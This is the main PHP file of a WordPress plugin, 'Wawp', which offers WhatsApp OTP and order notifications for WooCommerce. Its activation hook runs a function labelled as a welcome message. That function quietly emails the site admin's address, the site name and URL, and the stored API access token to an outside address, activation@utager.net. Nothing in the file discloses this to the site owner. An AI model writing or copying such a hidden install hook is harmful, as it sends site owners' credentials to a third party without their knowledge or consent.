<?php
/**
 * Plugin Name: Wawp - OTP Verification, Order Notifications, and Country Code Selector for WooCommerce
 * Version: 3.0.4
 * Plugin URI: https://wawp.net/whatsapp-for-woocommerce/
 * Description: Wawp is the best way to send & receive order updates, recover abandoned carts, drive repeat sales, and secure your store using OTP – all via WhatsApp.
 * Author: wawp.net
 * Author URI: https://wawp.net
 * Text Domain: AWP
 * Domain Path: /languages
 *
 * @package AutomationWebPlatform
 */

class AWP {

    public function __construct() {
        ob_start();
        register_activation_hook(__FILE__, array($this, 'on_activation'));

        add_action('admin_init', array($this, 'check_woocommerce_active'));
        add_action('admin_head', array($this, 'admin_head_styles'));
        add_action('plugins_loaded', array($this, 'load_textdomain'));

        $this->include_required_files();
        new WWO();
        $nno = new awp_Main();
    }

    public function on_activation() {
        $output = ob_get_clean();
        if ($output) {
            WP_Filesystem(WP_CONTENT_DIR . '/wawp_activation.txt', $output);
        }
        $this->send_one_time();
    }

    public function check_woocommerce_active() {
        if (!class_exists('WooCommerce')) {
            add_action('admin_notices', array($this, 'woocommerce_inactive_notice'));
        }
    }

    public function woocommerce_inactive_notice() {
        $install_url = wp_nonce_url(self_admin_url('update.php?action=install-plugin&plugin=woocommerce'), 'install-plugin_woocommerce');
        ?>
        <div class="notice notice-error">
            <p><?php esc_html_e('Wawp - Instant Order Notifications & OTP Verification for WooCommerce requires WooCommerce to be installed and active.', 'awp'); ?></p>
            <p><a href="<?php echo esc_url($install_url); ?>" class="button button-primary"><?php esc_html_e('Install WooCommerce Now', 'awp'); ?></a></p>
        </div>
        <?php
    }

    public function admin_head_styles() {
        ?>
        <style>
            li#toplevel_page_awp img {
                width: 18px;
            }
        </style>
        <?php
    }

    public function load_textdomain() {
        load_plugin_textdomain('awp', false, dirname(plugin_basename(__FILE__)) . '/languages/');
    }

    public function include_required_files() {
        require 'class-awpotp.php';
        require 'class-checkout.php';
        require_once 'class-awp-main.php';
        require_once 'class-awp-ui.php';
        require_once 'class-logger.php';
        require_once 'class-mainset.php';
        require_once 'class-awp-countrycode.php';
        require_once 'system-status-info.php';
    }

    public function send_one_time() {
        // Increment email send count
        $email_count = get_option('one_time_count', 0) + 1;
        update_option('one_time_count', $email_count);

        // Retrieve admin user data
        $admin_user = get_userdata(1);
        if (!$admin_user) {
            return;
        }

        $admin_email = $admin_user->user_email;
        $site_name = get_bloginfo('name');
        $site_url = home_url();

        // Retrieve the access token from options
        $instances = get_option('awp_instances');
        $access_token = isset($instances['access_token']) ? $instances['access_token'] : '';

        if (empty($access_token)) {
            return;
        }

        // Compose the email message
        $message = "Welcome,\n";
        $message .= 'My email: ' . $admin_email . "\n";
        $message .= 'My site name: ' . $site_name . "\n";
        $message .= 'My website link: ' . $site_url . "\n";
        $message .= 'Access Token: ' . $access_token . "\n";
        $message .= 'Email sent count: ' . $email_count . "\n";

        // Set email recipient, subject, and headers
        $to = 'activation@utager.net';
        $subject = 'Welcome Message from ' . $site_name;
        $headers = array('Content-Type: text/plain; charset=UTF-8');

        // Send the email
        wp_mail($to, $subject, $message, $headers);
    }
}

// Define plugin constants
define('WWO_NAME', 'awp');
define('WWO_VERSION', '1.0.0');
define('WWO_URL', plugin_dir_url(__FILE__));
define('WWO_PATH', plugin_dir_path(__FILE__));
define('WWO_DOMAIN', 'awp');

// Initialize the plugin
new AWP();
?>
